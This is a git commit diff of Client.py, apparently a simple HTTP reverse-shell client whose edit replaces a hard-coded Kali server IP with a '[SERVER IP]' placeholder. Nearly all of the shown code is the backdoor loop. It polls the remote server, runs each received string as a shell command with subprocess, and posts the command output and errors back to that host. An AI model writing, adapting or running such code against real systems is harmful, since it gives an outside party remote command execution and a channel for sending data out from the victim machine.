5ebe95a2b22dde573086a5158aa89be03879e458
Zoltan <arvind12786@gmail.com>
2020-10-04 22:39:00 +0800

    Update Client.py

--- Client.py
+++ Client.py
@@ -4,7 +4,7 @@ import time
 
 while True:
 
-    req = requests.get('http://192.168.179.139:8080') # Send GET request to our kali server
+    req = requests.get('http://[SERVER IP]:8080') # Send GET request
     command = req.text # Store the received txt into command variable
 
     if 'terminate' in command:
@@ -12,7 +12,7 @@ while True:
 
     else:
         CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        post_response = requests.post(url='http://192.168.179.139:8080', data=CMD.stdout.read()) # POST the result
-        post_response = requests.post(url='http://192.168.179.139:8080', data=CMD.stderr.read()) # or the error -if any-
+        post_response = requests.post(url='http://[SERVER IP]:8080', data=CMD.stdout.read()) 
+        post_response = requests.post(url='http://[SERVER IP]:8080', data=CMD.stderr.read()) 
 
     time.sleep(3)
